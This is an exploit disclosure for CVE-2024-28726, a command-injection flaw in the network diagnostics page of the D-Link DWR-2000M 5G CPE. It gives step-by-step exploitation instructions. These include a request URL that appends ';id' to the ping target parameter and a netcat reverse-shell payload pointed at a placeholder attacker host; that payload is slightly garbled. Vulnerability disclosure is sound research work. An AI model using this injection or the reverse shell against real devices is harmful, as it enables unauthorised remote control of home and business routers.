CVE-2024-28726,  Arbitraty Code Execution vulnerability in DLink DWR 2000M 5G CPE With


Exploit Title : CVE-2024-28726

Vulnerbaility: Remote Code Execution RCE

Date 10-11-2024

Author: Vinod Kumar Shrimali (mrnmap)

Vendor Homepage : https://dlinkmea.com/index.php/product/details?det=K1o4UkpXMHIreWZYMzhnV0JwbWFadz09

Researcher: Vinod Kumar Shrimali (mrnmap)| Nayab (Nk)


Model:   DLink DWR 2000M 5G CPE With Wifi 6 Ax1800 | Version: DWR-2000M_1.34ME


Description: 
During an examination of the Dlink 5G CPE firmware, A critical security vulnerability has been identified in the "Diagnostics" utility page of the Dlink 5G CPE firmware. Which leads to command injection. This vulnerability allows malicious actors to execute arbitrary system commands through the user input field, compromising the device's integrity and exposing it to various security risks. While functionalities such as ping and traceroute are intended for legitimate network diagnostics, the lack of robust security controls and input validation mechanisms allows for the execution of unauthorized commands, potentially leading to unauthorized access, data extraction, or other malicious activities within the network environment.



Step 1: Login to CPE and goto Network Diagnostic utillity for troubleshoto

Step 2 Run Ping Command and Capture Request in burpsuite

Step 3: terminate command with ; and system command 

like url.com/cgi-bin/luci/admin/status/network_diagnostics?cmdMethod=ping&target=xyz.com;id&PingCNT=5


Step 4 : For RCE

paylaod "rm -f /tmp/p; mkfifo /tmp/p p && nc attackerip 4444 0/tmp/f"
